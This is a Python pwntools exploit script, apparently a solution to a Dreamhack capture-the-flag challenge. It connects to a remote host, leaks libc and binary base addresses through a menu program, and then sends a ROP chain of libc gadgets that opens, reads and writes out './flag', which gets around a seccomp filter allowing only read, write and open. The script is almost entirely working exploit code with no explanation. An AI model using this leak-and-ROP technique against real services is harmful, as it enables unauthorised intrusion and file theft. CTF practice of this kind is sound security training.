from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 23185
r = remote(HOST, PORT)

'''
Allow read(), write(), open(), rt_sigreturn(), exit(), exit_group(), open_at()
'''

r.sendlineafter(b'exit\n', b'1')
r.recvuntil(b'shadow:\n')
libc=int(r.recvline().strip(),16)-0x29d90

r.sendlineafter(b'exit\n', b'3')
r.sendlineafter(b'exit\n', b'1')

r.recvuntil(b'shadow:\n')
r.recvline()
binary = int(r.recvline().strip(),16)-0x1782

r.sendlineafter(b'exit\n', b'2')

rd=libc+0x114980
opn=libc+0x114690
wr=libc+0x114a20
pop_rax=libc+0x45eb0
pop_rdi=libc+0x2a3e5
pop_rsi=libc+0x2be51
pop_rdx_r12=libc+0x11f497

r.sendlineafter(b'exit\n', b'2')
payload=flat([
    pop_rdi,
    b'A'*80,
    11,
    1,
    pop_rdi,0,
    pop_rsi,binary+0x4500,
    pop_rdx_r12,7,0,
    rd,

    pop_rdi,binary+0x4500,
    pop_rsi,0,
    pop_rdx_r12,0,0,
    opn,

    pop_rdi,3,
    pop_rsi,binary+0x4600,
    pop_rdx_r12,50,0,
    rd,

    pop_rdi,1,
    pop_rsi,binary+0x4600,
    pop_rdx_r12,50,0,
    wr,0,
])
r.sendafter(b'input:\n', payload)
r.sendlineafter(b'exit\n', b'5')

r.send(b'./flag')

r.interactive()